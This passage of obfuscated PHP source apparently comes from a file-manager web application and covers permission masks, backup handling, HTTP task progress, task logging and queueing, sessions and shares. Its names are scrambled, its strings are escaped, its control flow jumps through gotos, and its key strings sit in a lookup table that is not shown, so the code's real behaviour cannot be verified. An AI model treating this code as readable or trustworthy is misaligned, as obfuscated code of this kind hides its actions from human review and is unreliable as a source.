self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $×ŸëÁ€ú = array(); foreach ($Œ²Åó as $èæÙùæ) { if ($©Õ³Ê· & $èæÙùæ) { $×ŸëÁ€ú[] = $èæÙùæ; } } if (in_array(self::AUTH_ROOT, $×ŸëÁ€ú)) { $©Õ³Ê· = array_sum($Œ²Åó); return; } $Ë¾íšÆ• = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($×ŸëÁ€ú as $èæÙùæ) { if (isset($Ë¾íšÆ•[$èæÙùæ])) { $×ŸëÁ€ú = array_merge($×ŸëÁ€ú, $Ë¾íšÆ•[$èæÙùæ]); } } $×ŸëÁ€ú[] = self::AUTH_SHOW; $©Õ³Ê· = array_sum(array_unique($×ŸëÁ€ú)); } public function sort($ìÓë£èå, $Â‹ôàÔÓ) { return parent::update($ìÓë£èå, $Â‹ôàÔÓ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x62\x61\x63\x6b\165\x70\x4c\151\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\155\x65", "\x73\x74\141\164\x75\x73", "\x63\x6f\156\x74\x65\x6e\164", "\x6d\141\156\165\x61\154", "\162\145\x73\x75\154\x74", "\x74\x69\155\x65\x46\162\x6f\x6d", "\164\151\x6d\145\x54\157"); public function config() { $Íë´Åˆ =& $_SERVER[³Ôà×Ó]; Action($Íë´Åˆ[1988])->taskInit(); $•¡«ĞÍª = Model($Íë´Åˆ[845])->get($Íë´Åˆ[858]); $•¡«ĞÍª = json_decode($•¡«ĞÍª, !0); $•¡«ĞÍª = is_array($•¡«ĞÍª) ? $•¡«ĞÍª : array(); $this->parseContent($•¡«ĞÍª); unset($•¡«ĞÍª[$Íë´Åˆ[1735]]); Model($Íë´Åˆ[1734])->cacheClear(); $œÃã´¯° = $Íë´Åˆ[1989]; $¥ÇáË = Model($Íë´Åˆ[1990])->findByKey($Íë´Åˆ[1753], $œÃã´¯°); if (!$¥ÇáË) { $¥ÇáË = array(); } if (isset($¥ÇáË[$Íë´Åˆ[206]])) { $¥ÇáË[$Íë´Åˆ[206]] = json_decode($¥ÇáË[$Íë´Åˆ[206]], !0); } if (isset($•¡«ĞÍª[$Íë´Åˆ[206]])) { $¥ÇáË[$Íë´Åˆ[206]][$Íë´Åˆ[1738]] = $•¡«ĞÍª[$Íë´Åˆ[206]]; unset($•¡«ĞÍª[$Íë´Åˆ[206]]); } return array_merge($¥ÇáË, $•¡«ĞÍª); } public function listData($³’Ìß®è = false, $–ÓæœÄ¨ = "\155\157\x64\x69\x66\171\124\151\155\145", $û±¾á¬• = false) { $§ŸÌàó” = parent::listData($³’Ìß®è, $–ÓæœÄ¨, !0); if (!$§ŸÌàó”) { return $§ŸÌàó”; } if ($³’Ìß®è) { $§ŸÌàó” = array($§ŸÌàó”); } foreach ($§ŸÌàó” as &$ş÷õÀÜ») { $this->parseContent($ş÷õÀÜ»); } return $³’Ìß®è ? $§ŸÌàó”[0] : $§ŸÌàó”; } public function parseContent(&$ß×§Ì”) { $öøóÄ¤º =& $_SERVER[³Ôà×Ó]; $«Ššì§ˆ = _get($ß×§Ì”, $öøóÄ¤º[171], $öøóÄ¤º[91]); if (!in_array($«Ššì§ˆ, array($öøóÄ¤º[851], $öøóÄ¤º[1208]))) { $ß×§Ì”[$öøóÄ¤º[171]] = $«Ššì§ˆ == $öøóÄ¤º[91] ? $öøóÄ¤º[1208] : $öøóÄ¤º[851]; } } public function lastItem() { $Ùú “Ì = $this->listData(); return !empty($Ùú “Ì[0]) ? $Ùú “Ì[0] : null; } public function kill($‘ı¦´³š) { $†îìÛş½ =& $_SERVER[³Ôà×Ó]; $í³šå€Ù = $this->listData($‘ı¦´³š); if (!$í³šå€Ù || empty($í³šå€Ù[$†îìÛş½[32]])) { return !0; } Task::kill($†îìÛş½[857]); Task::kill($†îìÛş½[875]); Task::kill($†îìÛş½[884]); $‚·äÉÈİ = $í³šå€Ù[$†îìÛş½[32]]; $¸–Şâ‰å = TEMP_FILES . $†îìÛş½[854] . $‚·äÉÈİ . $†îìÛş½[8]; IO::remove($¸–Şâ‰å, !1); return $this->remove($‘ı¦´³š); } public function remove($ˆîÕò²¤) { $·ˆó¤Ä» = $this->listData($ˆîÕò²¤); if (!$·ˆó¤Ä») { return !0; } return $this->backupRemove($·ˆó¤Ä»); } private function backupRemove($¡’İì‡†) { parent::remove($¡’İì‡†[$_SERVER[³Ôà×Ó][484]]); $ı¾±ñìï = $this->backupPath($¡’İì‡†); IO::remove($ı¾±ñìï, !1); return !0; } private function backupPath($å£¶ş©˜) { $ö« ¢ú =& $_SERVER[³Ôà×Ó]; $áü¤°Ñ² = $å£¶ş©˜[$ö« ¢ú[32]]; $ÖÊÏ·İ = Model($ö« ¢ú[845])->get($ö« ¢ú[846]); $™²öÚ«º = substr(md5($ö« ¢ú[847] . $ÖÊÏ·İ . $áü¤°Ñ²), 0, 8); return "\173\x69\157\x3a{$å£¶ş©˜[$ö« ¢ú[827]]}\175\x2f\x64\141\164\x61\142\141\x73\145\57\x62\x61\143\153\165\160\x2f" . $áü¤°Ñ² . $ö« ¢ú[11] . $™²öÚ«º; } public function start() { $ÖÎëççÅ =& $_SERVER[³Ôà×Ó]; if ($GLOBALS[$ÖÎëççÅ[6]][$ÖÎëççÅ[92]][$ÖÎëççÅ[1991]] != $ÖÎëççÅ[91]) { return !0; } $“ÍëÙÃŞ = $this->config(); if (!$“ÍëÙÃŞ || $“ÍëÙÃŞ[$ÖÎëççÅ[1735]] != $ÖÎëççÅ[91]) { return !1; } if ($“ÍëÙÃŞ[$ÖÎëççÅ[171]] == $ÖÎëççÅ[851]) { $šø¿ “û = Model($ÖÎëççÅ[845])->get($ÖÎëççÅ[1321]); if ($šø¿ “û == $ÖÎëççÅ[1322]) { $“ÍëÙÃŞ[$ÖÎëççÅ[171]] = $ÖÎëççÅ[1208]; } } $ÏÓ¬Ê’‘ = $this->process(); foreach ($ÏÓ¬Ê’‘ as $¡âËİ¡÷) { if ($¡âËİ¡÷) { return Task::restart($¡âËİ¡÷[$ÖÎëççÅ[484]]); } } $ÄÜÏ‚§Ø = new Backup(); $¦äí…ñ‰ = $ÄÜÏ‚§Ø->db(); if ($¦äí…ñ‰) { $¦äí…ñ‰ = $ÄÜÏ‚§Ø->dbFile(); if ($¦äí…ñ‰ && $“ÍëÙÃŞ[$ÖÎëççÅ[171]] == $ÖÎëççÅ[851]) { $¦äí…ñ‰ = $ÄÜÏ‚§Ø->file(); } } Backup::set(array($ÖÎëççÅ[825] => 1, $ÖÎëççÅ[836] => time())); return !0; } public function process() { $şàãéÆ =& $_SERVER[³Ôà×Ó]; $ûªŒƒç× = array($şàãéÆ[832] => Task::get($şàãéÆ[857]), $şàãéÆ[837] => Task::get($şàãéÆ[875]), $şàãéÆ[230] => Task::get($şàãéÆ[884])); $è±©Ê¯ = !1; foreach ($ûªŒƒç× as &$ö€ŒåÌŠ) { if ($è±©Ê¯) { $ö€ŒåÌŠ = !1; continue; } if ($ö€ŒåÌŠ) { $Ê£”®šæ = intval(_get($ö€ŒåÌŠ, $şàãéÆ[1770], 0)); if (time() - $Ê£”®šæ > 7200) { Task::kill($ö€ŒåÌŠ[$şàãéÆ[484]]); $è±©Ê¯ = !0; $ö€ŒåÌŠ = !1; } } } return $ûªŒƒç×; } public function restore() { $Ü¹İè¾õ =& $_SERVER[³Ôà×Ó]; ActionCall($Ü¹İè¾õ[1135], !0, 1); ActionCall($Ü¹İè¾õ[1135], !0, 0); } } goto Aç‹Œì×ìæ; dˆŸÍå¬¨: class TaskHttp extends Task { protected function startAfter() { $õ…Ìô‰ =& $_SERVER[³Ôà×Ó]; $®Ö¬ùÅ• =& $this->task; $®Ö¬ùÅ•[$õ…Ìô‰[1842]] = 1; Hook::bind($õ…Ìô‰[1810], array($this, $õ…Ìô‰[1843])); Hook::bind($õ…Ìô‰[1812], array($this, $õ…Ìô‰[1844])); Hook::bind($õ…Ìô‰[1814], array($this, $õ…Ìô‰[1845])); } protected function endAfter() { $ä½õ»ÑÚ =& $_SERVER[³Ôà×Ó]; Hook::unbind($ä½õ»ÑÚ[1810], array($this, $ä½õ»ÑÚ[1843])); Hook::unbind($ä½õ»ÑÚ[1812], array($this, $ä½õ»ÑÚ[1844])); Hook::unbind($ä½õ»ÑÚ[1814], array($this, $ä½õ»ÑÚ[1845])); } public function progressStart($È³¸“½ô) { $îÒ¬µâÑ =& $_SERVER[³Ôà×Ó]; $óšé› = curl_getinfo($È³¸“½ô); self::log($îÒ¬µâÑ[1846] . $óšé›[$îÒ¬µâÑ[383]]); self::valueSet($this->task[$îÒ¬µâÑ[484]], $this->task); } public function progressEnd($¾ù ŠÓô) { $”€Ø€Öâ =& $_SERVER[³Ôà×Ó]; self::log($”€Ø€Öâ[1847] . $this->task[$”€Ø€Öâ[484]]); $this->end(); } public function progress($ŸºÄïïÛ, $¢¢Ô«Ú¬, $¢Úáô……, $¡²œµ, $³‹ë«¢ƒ) { $¬Ê†îûÛ =& $_SERVER[³Ôà×Ó]; $ó”·àŠ =& $this->task; if ($³‹ë«¢ƒ > 0) { $ó”·àŠ[$¬Ê†îûÛ[1138]] = $ó”·àŠ[$¬Ê†îûÛ[1138]] == 0 ? $¡²œµ : $ó”·àŠ[$¬Ê†îûÛ[1138]]; $ó”·àŠ[$¬Ê†îûÛ[1766]] = $³‹ë«¢ƒ; } else { if ($¢Úáô…… > 0) { $ó”·àŠ[$¬Ê†îûÛ[1138]] = $ó”·àŠ[$¬Ê†îûÛ[1138]] == 0 ? $¢¢Ô«Ú¬ : $ó”·àŠ[$¬Ê†îûÛ[1138]]; $ó”·àŠ[$¬Ê†îûÛ[1766]] = $¢Úáô……; } } $this->update(); self::log("\160\x72\x6f\147\x72\x65\x73\x73\110\x74\x74\x70\72\x64\157\x77\x6e\72{$¢Úáô……}\x2f{$¢¢Ô«Ú¬}\x3b\x20\165\x70\x6c\157\141\144\72{$³‹ë«¢ƒ}\x2f{$¡²œµ}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¢±ÂÈûË, $´ä¬·›¡ = '', $‰¢À¹¬é = 0, $ó¼š†å¾ = '') { $ëëøíğì =& $_SERVER[³Ôà×Ó]; $ó¼š†å¾ = $ó¼š†å¾ ? $ó¼š†å¾ : ($´ä¬·›¡ ? $´ä¬·›¡ : $¢±ÂÈûË); $ôºáºæ‚ = new Task($¢±ÂÈûË, $´ä¬·›¡, $‰¢À¹¬é, $ó¼š†å¾); $GLOBALS[$ëëøíğì[1848] . $¢±ÂÈûË] = new TaskLog($ëëøíğì[1749], $ôºáºæ‚, $ó¼š†å¾); return $ôºáºæ‚; } public function __construct($ıíø‘” = '', $ØÃÛÍÍ = '', $Æü©–Øõ = '') { $ü…ø£¹„ =& $_SERVER[³Ôà×Ó]; if (!$ıíø‘”) { $ıíø‘” = $ü…ø£¹„[1749]; } $­ñ¸¥óß = $ıíø‘” . $ü…ø£¹„[471] . rand_string(10); if (!$Æü©–Øõ) { $Æü©–Øõ = $ıíø‘” . $ü…ø£¹„[53] . $Æü©–Øõ; } switch ($ıíø‘”) { case $ü…ø£¹„[1749]: if (!$ØÃÛÍÍ || !$ØÃÛÍÍ->task) { return echoLog($ıíø‘” . $ü…ø£¹„[1849]); } $†’„Çõ = $ØÃÛÍÍ; $­ñ¸¥óß = $†’„Çõ->task[$ü…ø£¹„[484]]; $ıíø‘” = $†’„Çõ->task[$ü…ø£¹„[484]]; if (!$†’„Çõ->task[$ü…ø£¹„[1654]]) { $†’„Çõ->task[$ü…ø£¹„[1654]] = $Æü©–Øõ ? $Æü©–Øõ : $ıíø‘”; } break; case $ü…ø£¹„[1850]: if (!$ØÃÛÍÍ) { return echoLog($ıíø‘” . $ü…ø£¹„[1851]); } $øÁøÉ±â = is_string($ØÃÛÍÍ) ? array($ØÃÛÍÍ) : $ØÃÛÍÍ; $†’„Çõ = new TaskFileTransfer($­ñ¸¥óß, $ıíø‘”, 0, $Æü©–Øõ ? $Æü©–Øõ : $øÁøÉ±â[0]); foreach ($øÁøÉ±â as $¨“í® ) { $†’„Çõ->addPath($¨“í® ); } break; case $ü…ø£¹„[389]: if (!$ØÃÛÍÍ) { return echoLog($ıíø‘” . $ü…ø£¹„[1851]); } $øÁøÉ±â = is_string($ØÃÛÍÍ) ? array($ØÃÛÍÍ) : $ØÃÛÍÍ; $†’„Çõ = new TaskZip($­ñ¸¥óß, $ıíø‘”, 0, $Æü©–Øõ ? $Æü©–Øõ : $øÁøÉ±â[0]); foreach ($øÁøÉ±â as $¨“í® ) { $†’„Çõ->addPath($¨“í® ); } break; case $ü…ø£¹„[1296]: if (!$ØÃÛÍÍ) { return echoLog($ıíø‘” . $ü…ø£¹„[1851]); } $†’„Çõ = new TaskUnZip($­ñ¸¥óß, $ıíø‘”, 0, $Æü©–Øõ ? $Æü©–Øõ : $ØÃÛÍÍ); if ($ØÃÛÍÍ) { $†’„Çõ->addFile($ØÃÛÍÍ); } break; case $ü…ø£¹„[152]: $†’„Çõ = new TaskHttp($­ñ¸¥óß, $ıíø‘”); break; default: return; break; } $this->task = $†’„Çõ; $this->taskID = $­ñ¸¥óß; Hook::bind($ü…ø£¹„[1786], array($this, $ü…ø£¹„[1852])); Hook::bind($ü…ø£¹„[1788], array($this, $ü…ø£¹„[1853])); Hook::bind($ü…ø£¹„[1782], array($this, $ü…ø£¹„[1854])); echoLog($ü…ø£¹„[1855] . $†’„Çõ->task[$ü…ø£¹„[1654]]); } public function __destruct() { $this->end(); } public function end($ç›ºœÌ = '') { $˜ÇŸøÉ´ =& $_SERVER[³Ôà×Ó]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ç›ºœÌ); $this->task = !1; $this->taskID = !1; Hook::unbind($˜ÇŸøÉ´[1786], array($this, $˜ÇŸøÉ´[1852])); Hook::unbind($˜ÇŸøÉ´[1788], array($this, $˜ÇŸøÉ´[1853])); Hook::unbind($˜ÇŸøÉ´[1782], array($this, $˜ÇŸøÉ´[1854])); } public function taskUpdate($ñÀ¡éÛÌ) { $Ö§†õºİ =& $_SERVER[³Ôà×Ó]; if (!$ñÀ¡éÛÌ || $this->taskID != $ñÀ¡éÛÌ[$Ö§†õºİ[484]]) { return; } $ûŞ’â¼Ä = 20; $’´æğô = intval($ñÀ¡éÛÌ[$Ö§†õºİ[1767]] * $ûŞ’â¼Ä); $Û­ßÆû« = $Ö§†õºİ[176] . str_repeat($Ö§†õºİ[959], $’´æğô) . $Ö§†õºİ[1089] . str_repeat($Ö§†õºİ[53], $ûŞ’â¼Ä - $’´æğô) . $Ö§†õºİ[178]; $¥å×”ß¶ = $Û­ßÆû« . sprintf($Ö§†õºİ[1856], $ñÀ¡éÛÌ[$Ö§†õºİ[1767]] * 100) . $Ö§†õºİ[1857]; $ÅÃşÑ£’ = $¥å×”ß¶ . $ñÀ¡éÛÌ[$Ö§†õºİ[1766]] . $Ö§†õºİ[8] . $ñÀ¡éÛÌ[$Ö§†õºİ[1138]] . LNG($Ö§†õºİ[1858]); $ÊÎÃ¦Ê˜ = $Ö§†õºİ[12]; if ($ñÀ¡éÛÌ[$Ö§†õºİ[1842]]) { $ÅÃşÑ£’ = $¥å×”ß¶ . size_format($ñÀ¡éÛÌ[$Ö§†õºİ[1766]]) . $Ö§†õºİ[8] . size_format($ñÀ¡éÛÌ[$Ö§†õºİ[1138]]); $ÊÎÃ¦Ê˜ = size_format($ñÀ¡éÛÌ[$Ö§†õºİ[1768]]) . $Ö§†õºİ[1859]; } if ($ñÀ¡éÛÌ[$Ö§†õºİ[1140]]) { $ñÀ¡éÛÌ[$Ö§†õºİ[1816]] = $ñÀ¡éÛÌ[$Ö§†õºİ[1140]] . $Ö§†õºİ[53] . $ñÀ¡éÛÌ[$Ö§†õºİ[1816]]; } if ($ñÀ¡éÛÌ[$Ö§†õºİ[1816]]) { $ô–„´Î = $Ö§†õºİ[12]; if ($ñÀ¡éÛÌ[$Ö§†õºİ[1818]]) { $ô–„´Î = $Ö§†õºİ[50] . size_format($ñÀ¡éÛÌ[$Ö§†õºİ[1819]]) . $Ö§†õºİ[8] . size_format($ñÀ¡éÛÌ[$Ö§†õºİ[1818]]); } $ÊÎÃ¦Ê˜ .= $ñÀ¡éÛÌ[$Ö§†õºİ[1816]] . $ô–„´Î; } if ($ñÀ¡éÛÌ[$Ö§†õºİ[838]] && !$ñÀ¡éÛÌ[$Ö§†õºİ[1818]]) { $ÊÎÃ¦Ê˜ .= $Ö§†õºİ[53] . size_format($ñÀ¡éÛÌ[$Ö§†õºİ[1823]]) . $Ö§†õºİ[8] . size_format($ñÀ¡éÛÌ[$Ö§†õºİ[838]]); } echoLog($ÅÃşÑ£’ . $Ö§†õºİ[53] . $ÊÎÃ¦Ê˜, !0); } public function taskEnd($õì³Ç»Ï) { $¹ü¯˜‚ø =& $_SERVER[³Ôà×Ó]; if (!$õì³Ç»Ï || $this->taskID != $õì³Ç»Ï[$¹ü¯˜‚ø[484]]) { return; } $ììÊ¼é = $õì³Ç»Ï ? $õì³Ç»Ï[$¹ü¯˜‚ø[1766]] . $¹ü¯˜‚ø[8] . $õì³Ç»Ï[$¹ü¯˜‚ø[1138]] . LNG($¹ü¯˜‚ø[1858]) . $¹ü¯˜‚ø[74] : $¹ü¯˜‚ø[12]; echoLog($¹ü¯˜‚ø[1860] . $õì³Ç»Ï[$¹ü¯˜‚ø[1654]] . ($õì³Ç»Ï[$¹ü¯˜‚ø[535]] ? $¹ü¯˜‚ø[74] . $õì³Ç»Ï[$¹ü¯˜‚ø[535]] : $¹ü¯˜‚ø[12]) . $¹ü¯˜‚ø[74] . $ììÊ¼é . $¹ü¯˜‚ø[1861] . sprintf($¹ü¯˜‚ø[925], timeFloat() - $õì³Ç»Ï[$¹ü¯˜‚ø[1769]]) . $¹ü¯˜‚ø[1781]); $this->end(); } public function taskKill($û¥º¯á„) { $¿Óª¥¦ =& $_SERVER[³Ôà×Ó]; if (!$û¥º¯á„ || $this->taskID != $û¥º¯á„[$¿Óª¥¦[484]]) { return; } echoLog($¿Óª¥¦[1862] . $û¥º¯á„[$¿Óª¥¦[1654]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\153\x51\165\145\165\145\114\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\141\x73\x6b\x51\165\x65\x75\x65\104\141\164\x61"; const QUEUE_TIME = "\164\x61\x73\x6b\x51\165\x65\x75\145\x4c\x61\x73\164\122\165\x6e"; const QUEUE_THREAD = "\x74\x61\163\x6b\121\x75\x65\x75\145\124\x68\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($°Ï÷²Ş, $È÷ù©¼Â = array(), $“¿Âëè› = '', $§…ïßš = '') { $ŠÜã®‚ =& $_SERVER[³Ôà×Ó]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($§…ïßš && array_find_by_field(self::$listData, $ŠÜã®‚[97], $§…ïßš)) { return !0; } if ($§…ïßš && array_find_by_field(self::$listDataAdd, $ŠÜã®‚[97], $§…ïßš)) { return !0; } self::$listDataAdd[] = array($ŠÜã®‚[341] => $°Ï÷²Ş, $ŠÜã®‚[1863] => $È÷ù©¼Â, $ŠÜã®‚[535] => $“¿Âëè›, $ŠÜã®‚[97] => $§…ïßš); return !0; } public static function addSubmit() { $²æ‡¤ƒ =& $_SERVER[³Ôà×Ó]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($²æ‡¤ƒ[1864] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $²æ‡¤ƒ[12], $²æ‡¤ƒ[535])), $²æ‡¤ƒ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÈóİÑöÅ, $øŒ’ËÜ— = array(), $Áäô»¤é = '', $²£©‚ÕÉ = '') { $÷³éÊÛ³ =& $_SERVER[³Ôà×Ó]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Œ±Ş’Ôî = self::getAll(); if ($²£©‚ÕÉ && array_find_by_field($Œ±Ş’Ôî, $÷³éÊÛ³[97], $²£©‚ÕÉ)) { return !0; } $Œ±Ş’Ôî[] = array($÷³éÊÛ³[341] => $ÈóİÑöÅ, $÷³éÊÛ³[1863] => $øŒ’ËÜ—, $÷³éÊÛ³[535] => $Áäô»¤é, $÷³éÊÛ³[97] => $²£©‚ÕÉ); self::setAll($Œ±Ş’Ôî); write_log($÷³éÊÛ³[1864] . $Áäô»¤é, $÷³éÊÛ³[197]); return !0; } public static function run() { $‘†Ò¨Ñö =& $_SERVER[³Ôà×Ó]; $ğ›şˆ­° = self::getAll(); $Œ ÙÉÙ = array_shift($ğ›şˆ­°); if (!$Œ ÙÉÙ) { return !1; } self::setAll($ğ›şˆ­°); $¤¬¾·­ = timeFloat(); $«Åñ•Ôé = $‘†Ò¨Ñö[12]; try { $«Åñ•Ôé = Hook::apply($Œ ÙÉÙ[$‘†Ò¨Ñö[341]], $Œ ÙÉÙ[$‘†Ò¨Ñö[1863]]); } catch (Exception $´Áº¢Èå) { write_log($´Áº¢Èå, $‘†Ò¨Ñö[1261]); } $Î“¶ÜÌ = number_format(timeFloat() - $¤¬¾·­, 3) . $‘†Ò¨Ñö[1781]; if ($«Åñ•Ôé && is_string($«Åñ•Ôé)) { $Î“¶ÜÌ = $Î“¶ÜÌ . $‘†Ò¨Ñö[1865] . $«Åñ•Ôé; } write_log($‘†Ò¨Ñö[1866] . $Œ ÙÉÙ[$‘†Ò¨Ñö[535]] . $‘†Ò¨Ñö[1867] . $Î“¶ÜÌ, $‘†Ò¨Ñö[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Œ“íÅ´Ò =& $_SERVER[³Ôà×Ó]; $¿ÍÆÆª¾ = self::threadCount() + 1; if ($¿ÍÆÆª¾ > 3 || !self::count()) { return; } write_log($Œ“íÅ´Ò[1868] . $¿ÍÆÆª¾, $Œ“íÅ´Ò[197]); Cache::set(self::QUEUE_THREAD, $¿ÍÆÆª¾, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Œ“íÅ´Ò[1869], $Œ“íÅ´Ò[197]); } public static function getKey($‘å”É¡â, $¥Â´µÉí = "\x69\156\164") { $¬´Ù…¢ =& $_SERVER[³Ôà×Ó]; Cache::removeMemory($‘å”É¡â); $ÏÁºô’‹ = Cache::get($‘å”É¡â); if ($¥Â´µÉí == $¬´Ù…¢[364]) { return $ÏÁºô’‹ ? intval($ÏÁºô’‹) : 0; } if ($¥Â´µÉí == $¬´Ù…¢[1870]) { return is_array($ÏÁºô’‹) ? $ÏÁºô’‹ : array(); } return $ÏÁºô’‹; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[³Ôà×Ó][1870]); } public static function setAll($¯àÀ·ƒ) { $±ü—Ë‹À = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¯àÀ·ƒ), $±ü—Ë‹À); Cache::set(self::QUEUE_DATA, $¯àÀ·ƒ, $±ü—Ë‹À); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto d…›‰²óÚ­; Eùî”ª†ÂÅ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\137\x73\145\163\163\x69\x6f\x6e"; public function get($’Èé¢¶ç) { $ıÎ¼¦ùå =& $_SERVER[³Ôà×Ó]; $ÂßòÙ³† = $this->where(array($ıÎ¼¦ùå[2102] => $’Èé¢¶ç))->find(); if (!is_array($ÂßòÙ³†)) { return !1; } return $ÂßòÙ³†[$ıÎ¼¦ùå[171]]; } public function set($Åº¥±Ğ”, $ºÂ®•Çå, $…«í¡Üë = 3600) { $›‹·ÙÁ =& $_SERVER[³Ôà×Ó]; $Ç´ÓÔÍÛ = array($›‹·ÙÁ[2102] => $Åº¥±Ğ”, $›‹·ÙÁ[2002] => $ºÂ®•Çå, $›‹·ÙÁ[2103] => $…«í¡Üë + time()); if (Session::get($›‹·ÙÁ[2104])) { $Ç´ÓÔÍÛ[$›‹·ÙÁ[1765]] = Session::get($›‹·ÙÁ[2104]); } else { $Ç´ÓÔÍÛ[$›‹·ÙÁ[1765]] = 0; } if ($this->get($Åº¥±Ğ”)) { return $this->where(array($›‹·ÙÁ[2102] => $Åº¥±Ğ”))->save($Ç´ÓÔÍÛ); } else { return $this->add($Ç´ÓÔÍÛ, array(), !0); } } public function remove($äÔ¢ı¦·) { return $this->where(array($_SERVER[³Ôà×Ó][2102] => $äÔ¢ı¦·))->delete(); } public function clearTimeout() { return $this->where($_SERVER[³Ôà×Ó][2105] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\163\145\x72\x74\x2c\x75\160\144\x61\164\x65", "\146\165\x6e\x63\164\151\x6f\156"), array("\x63\162\145\141\164\145\x54\x69\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\x65\x72\164", "\146\x75\156\x63\164\151\157\x6e"), array("\x6f\160\164\x69\157\156\x73", '', "\x69\156\163\145\x72\164\54\165\x70\144\141\x74\x65\54\163\145\x6c\x65\x63\164", "\x6a\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ùºõ½°©) { $şà„ñÏ© =& $_SERVER[³Ôà×Ó]; $¨ßş§Ôã = isset($ùºõ½°©[0]) ? $ùºõ½°©[0] : !1; return array($şà„ñÏ©[2106] => array(USER_ID, $şà„ñÏ©[2107]), $şà„ñÏ©[2047] => array($¨ßş§Ôã, $şà„ñÏ©[2108])); } protected function listSimple() { $£õ›»Ñ— = array($_SERVER[³Ôà×Ó][1765] => USER_ID); $ŞŸêÜú = $this->field($this->fieldList)->where($£õ›»Ñ—)->select(); return $ŞŸêÜú ? $ŞŸêÜú : array(); } protected function getInfo($œºÕëêá, $•Ã£¤ = false) { $æÕ™¿ì¥ =& $_SERVER[³Ôà×Ó]; if ($•Ã£¤) { return $this->_getShareInfo(array($æÕ™¿ì¥[674] => $œºÕëêá)); } $Øúµë‘× = $this->cacheFunctionGet($æÕ™¿ì¥[2049], $œºÕëêá); return $Øúµë‘×; } public function getInfoByHash($óŠ²İ„Á) { return $this->_getShareInfo(array($_SERVER[³Ôà×Ó][2109] => $óŠ²İ„Á)); } public function getInfoByPath($Õ“õÊõï) { $¼—ø§äğ =& $_SERVER[³Ôà×Ó]; $û™í¢Ñã = array($¼—ø§äğ[1765] => USER_ID, $¼—ø§äğ[193] => $Õ“õÊõï); return $this->_getShareInfo($û™í¢Ñã); } public function getInfoBySourcePath($ˆ·ÜıâÇ) { $²àÏÎŸº =& $_SERVER[³Ôà×Ó]; $™„Œ¬ö‹ = array($²àÏÎŸº[1765] => USER_ID, $²àÏÎŸº[1254] => $ˆ·ÜıâÇ); return $this->_getShareInfo($™„Œ¬ö‹); } private function _getShareInfo($ı¸ºş è) { $Ì”é›¶ =& $_SERVER[³Ôà×Ó]; $–š³†Œ = $this->where($ı¸ºş è)->find(); if (!$–š³†Œ) { return !1; } $ı¸ºş è = array($Ì”é›¶[674] => $–š³†Œ[$Ì”é›¶[674]]); $çòì¬ïÈ = $Ì”é›¶[2110]; $»ãÌ½‚ä = Model($Ì”é›¶[675])->order($Ì”é›¶[484])->field($çòì¬ïÈ)->where($ı¸ºş è)->select(); if ($–š³†Œ[$Ì”é›¶[193]] == $Ì”é›¶[228]) { $–š³†Œ[$Ì”é›¶[90]] = IO::info($–š³†Œ[$Ì”é›¶[1254]]); } else { $–š³†Œ[$Ì”é›¶[90]] = Model($Ì”é›¶[1414])->pathInfo($–š³†Œ[$Ì”é›¶[193]]); } $–š³†Œ[$Ì”é›¶[2111]] = $»ãÌ½‚ä; return $–š³†Œ; } protected function getInfoAuth($âÊ›ïÌ€) { $ÄË×†€¡ =& $_SERVER[³Ôà×Ó]; $§›ÇóğÑ = $this->getInfo($âÊ›ïÌ€); if ($§›ÇóğÑ[$ÄË×†€¡[1765]] == USER_ID) { $§›ÇóğÑ[$ÄË×†€¡[496]] = $§›ÇóğÑ[$ÄË×†€¡[90]][$ÄË×†€¡[496]]; } else { $§›ÇóğÑ[$ÄË×†€¡[496]] = Model($ÄË×†€¡[576])->authMake($§›ÇóğÑ[$ÄË×†€¡[2111]]); } return $§›ÇóğÑ; } protected function listData($­àóÃû˜ = null, $Ò·õö¼Ô = 300) { $Ğ÷ùØ·ø =& $_SERVER[³Ôà×Ó]; $ÇÉà”×Æ = array(array($Ğ÷ùØ·ø[571] => array($Ğ÷ùØ·ø[1087], 0), $Ğ÷ùØ·ø[672] => array($Ğ÷ùØ·ø[1087], 0), $Ğ÷ùØ·ø[2112] => 